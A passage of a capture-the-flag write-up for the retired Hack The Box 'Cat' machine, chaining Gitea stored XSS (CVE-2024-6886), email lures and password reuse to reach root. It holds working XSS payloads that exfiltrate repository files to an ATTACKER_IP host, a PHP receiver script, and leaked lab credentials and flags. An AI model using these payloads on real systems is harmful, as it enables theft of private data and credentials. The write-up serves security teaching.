We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```

#### 🚩 user.txt

Axel holds the `user.txt` flag.
```
axel@cat:~$ cat /home/axel/user.txt
fc6f3bac19ebbe26534191ec15e8c866
```

## 📬 Internal Gitea — A New Attack Surface

### 🔎 Recon

Axel’s emails hinted at a Gitea service running on `http://localhost:3000`. A quick `netstat` confirmed the port was open—but only on localhost.
```
axel@cat:~$ netstat -tlpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:49733         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33353         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33389         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

Using SSH port forwarding:
```
fcoomans@kali:~/htb/cat$ ssh -L 127.0.0.1:3000:127.0.0.1:3000 axel@cat.htb
axel@cat.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
```

I accessed Gitea from a browser and found it was running version 1.22.0:

![](images/Pasted%20image%2020250702071649.png)

Signing in to Gitea with Axel's credentials.

![](images/Pasted%20image%2020250702072811.png)

Shows that Axel is probably not a sector administrator as he cannot access the Employee management repo.

![](images/Pasted%20image%2020250702072915.png)

#### 🐞 CVE-2024-6886

`searchsploit` shows that Gitea 1.22.0 is vulnerable to a Stored XSS exploit.
```
fcoomans@kali:~/htb/cat$ searchsploit gitea 1.22
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
Gitea 1.22.0 - Stored XSS                          | multiple/webapps/52077.txt
--------------------------------------------------- ---------------------------------
```

```
fcoomans@kali:~/htb/cat$ PAGER=cat searchsploit -x 52077
  Exploit: Gitea 1.22.0 - Stored XSS
      URL: https://www.exploit-db.com/exploits/52077
     Path: /usr/share/exploitdb/exploits/multiple/webapps/52077.txt
    Codes: N/A
 Verified: False
File Type: HTML document, ASCII text
# Exploit Title: Stored XSS in Gitea
# Date: 27/08/2024
# Exploit Authors: Catalin Iovita & Alexandru Postolache
# Vendor Homepage: (https://github.com/go-gitea/gitea)
# Version: 1.22.0
# Tested on: Linux 5.15.0-107, Go 1.23.0
# CVE: CVE-2024-6886

## Vulnerability Description
Gitea 1.22.0 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. This vulnerability allows an attacker to inject malicious scripts that get stored on the server and executed in the context of another user's session.

## Steps to Reproduce
1. Log in to the application.
2. Create a new repository or modify an existing repository by clicking the Settings button from the `$username/$repo_name/settings` endpoint.
3. In the Description field, input the following payload:

    <a href=javascript:alert()>XSS test</a>

4. Save the changes.
5. Upon clicking the repository description, the payload was successfully injected in the Description field. By clicking on the message, an alert box will appear, indicating the execution of the injected script.
```

The plan is to:
1. Start a PHP server running on the attack host with a PHP script that will save the content sent to it to a local file.
2. Create a XSS payload that will retrieve a webpage and then send it to the PHP server on the attack host.
3. Send an e-mail to `jobert` to look at the repo.  When `jobert` looks at the repo Description and clicks on the link, then the XSS payload will run and read a file that only `jobert` has access to and send it to the attack host.

### 🧪 Gitea Exploitation (XSS v2)

I created a PHP file named `save.php` to save a file exfiltrated from Gitea to the `output.txt` file.
```php
<?php

if (isset($_POST['body'])) {
    $content = $_POST['body'];
    $filePath = 'output.txt';
    file_put_contents($filePath, $content);
}
?>
```

A PHP development server is started on port 8000 to serve `save.php`.
```
fcoomans@kali:~/htb/cat/www$ php -S 0.0.0.0:8000
[Wed Jul  2 01:05:30 2025] PHP 8.2.27 Development Server (http://0.0.0.0:8000) started
```

I created a repo with this XSS payload in the Description:
```
<a href="javascript:fetch('http://localhost:3000/axel/test/raw/branch/main/README.md').then(function(r){return r.text()}).then(function(d){fetch('http://ATTACKER_IP:8000/save.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'body=' + encodeURIComponent(d)})})">Click</a>
```

![](images/Pasted%20image%2020250701183702.png)

This creates a link named `Click` in the Description of the `test` repo.
I click the link to test the XSS payload.

![](images/Pasted%20image%2020250701183755.png)

And see a POST request to `/save.php`.
```
fcoomans@kali:~/htb/cat/www$ php -S 0.0.0.0:8000
[Wed Jul  2 01:05:30 2025] PHP 8.2.27 Development Server (http://0.0.0.0:8000) started
[Wed Jul  2 01:05:56 2025] ATTACKER_IP:56488 Accepted
[Wed Jul  2 01:05:56 2025] ATTACKER_IP:56488 [200]: POST /save.php
[Wed Jul  2 01:05:56 2025] ATTACKER_IP:56488 Closing
```

The `test` repo `README.md` was saved to `output.txt`.
```
fcoomans@kali:~/htb/cat/www$ cat output.txt
# test

<a href="javascript:fetch('http://localhost:3000/axel/test/raw/branch/main/README.md').then(function(r){return r.text()}).then(function(d){fetch('http://ATTACKER_IP:8000/save.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'body=' + encodeURIComponent(d)})})">Click</a>
```

Great I now know that the XSS works!

A cleanup script runs periodically on the server and delete all repos.
If this happens, just create a new `test` repo with a new XSS payload in Description.
If the `test` repo is still available, then edit the repo `Settings` and change the XSS payload in Description.

![](images/Pasted%20image%2020250701184627.png)

I create a new XSS payload to retrieve the `Employee-management` repo `README.md` which was mentioned in the e-mail to Axel.
```
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(function(r){return r.text()}).then(function(d){fetch('http://ATTACKER_IP:8000/save.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'body=' + encodeURIComponent(d)})})">Click</a>
```

The `test` repo `Description` is updated with the new `XSS payload`.

![](images/Pasted%20image%2020250701184511.png)

And an e-mail is then sent to Jobert with a link to the `test` repo.
```
axel@cat:~$ echo "Subject: Repo\n\nCheck http://localhost:3000/axel/test" |sendmail jobert@localhost
```

Jobert opens the e-mail and clicks on the link in the Descriptions of the `test` repo.
The XSS payload is triggered and sends the content of the `Employee-management` repo `README.md` (that Jobert can access) to the attack host and it's written to the `output.txt` file.
It says that only the `admin` user can use the site and that it's not visible to employees.
```
fcoomans@kali:~/htb/cat/www$ cat output.txt
# Employee Management
Site under construction. Authorized user: admin. No visibility or updates visible to employees.
```

The XSS payload is Description of the `test` repo is modified yet again to retrieve the full repo page which was also mentioned in the e-mail to Axel.
```
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/').then(function(r){return r.text()}).then(function(d){fetch('http://ATTACKER_IP:8000/save.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'body=' + encodeURIComponent(d)})})">Click</a>
```

And another e-mail is sent to Jobert to check out the repo.
```
axel@cat:~$ echo "Subject: Repo\n\nCheck http://localhost:3000/axel/test" |sendmail jobert@localhost
```

Jobert once again looks at the `test` repo and clicks on the link.  It sends the HTML page for the `Employee-mangement` repo to the attack host.
`grep 'class="muted"' output.txt` searches for all lines listing the repo files.
It shows that the repo contains the files `chart.min.js`, `dashboard.php`, `index.php`, `logout.php`, `README.md` and `style.css`.
```
fcoomans@kali:~/htb/cat/www$ grep 'class="muted"' output.txt
                                                <a class="muted tw-font-normal" href="/administrator">administrator</a>/<a class="muted" href="/administrator/Employee-management">Employee-management</a>
                                                                <a class="muted" href="/administrator/Employee-management/src/branch/main/chart.min.js" title="chart.min.js">chart.min.js</a>
                                                                <a class="muted" href="/administrator/Employee-management/src/branch/main/dashboard.php" title="dashboard.php">dashboard.php</a>
                                                                <a class="muted" href="/administrator/Employee-management/src/branch/main/index.php" title="index.php">index.php</a>
                                                                <a class="muted" href="/administrator/Employee-management/src/branch/main/logout.php" title="logout.php">logout.php</a>
                                                                <a class="muted" href="/administrator/Employee-management/src/branch/main/README.md" title="README.md">README.md</a>
                                                                <a class="muted" href="/administrator/Employee-management/src/branch/main/style.css" title="style.css">style.css</a>
```

Okay, let's start by retrieving the `index.php` file in its Raw format.
The XSS payload is once again updated in the `test` repo Description.
```
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(function(r){return r.text()}).then(function(d){fetch('http://ATTACKER_IP:8000/save.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'body=' + encodeURIComponent(d)})})">Click</a>
```

And an e-mail is once again sent to Jobert to look at the `test` repo.
```
axel@cat:~$ echo "Subject: Repo\n\nCheck http://localhost:3000/axel/test" |sendmail jobert@localhost
```

The `index.php` is sent to the attack host and the file contains the `admin` username and password.
```
fcoomans@kali:~/htb/cat/www$ cat output.txt
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {

    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
```

#### 🔼 Root via Password Reuse

I guessed (correctly) that the `admin` password might also work for `root`. A quick `su -`, using the password `IKw75eR0MR7CMIxhH0` and I am in:
```
axel@cat:~$ su -
Password:
root@cat:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cat:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:7d:3d brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.53/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:7d3d/64 scope link
       valid_lft forever preferred_lft forever
```

### 💰 Post Exploitation

#### 🏆 root.txt flag

`root` is the holder of the `root.txt` flag.
```
root@cat:~# cat /root/root.txt
455ffdd75ac5c60d693d3e439298984b
```

And `Cat has been Pwned!` 🎉

![](images/Pasted%20image%2020250702095356.png)
## 📚 Lessons Learned

-  **Even small misconfigs can be lethal**  
    Exposed `.git` directories, GET-based logins, and lack of cookie security combined to form a powerful attack surface.
- **Stored XSS can go far beyond pop-ups**  
    This machine perfectly illustrates how XSS, combined with poor session management, can lead to full compromise—twice!
- **Always sanitize and validate input**  
    SQL injection and XSS were both enabled due to a lack of proper filtering. Relying solely on frontend controls or naïve regexes isn’t enough.
- **Read the code, read the logs, read the mail**  
    Post-exploitation required digging through logs and emails—skills that are just as vital as finding the initial vuln.
- **Don't reuse credentials**  
    Reusing the `admin` password for the `root` user sealed the deal. A common mistake.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.
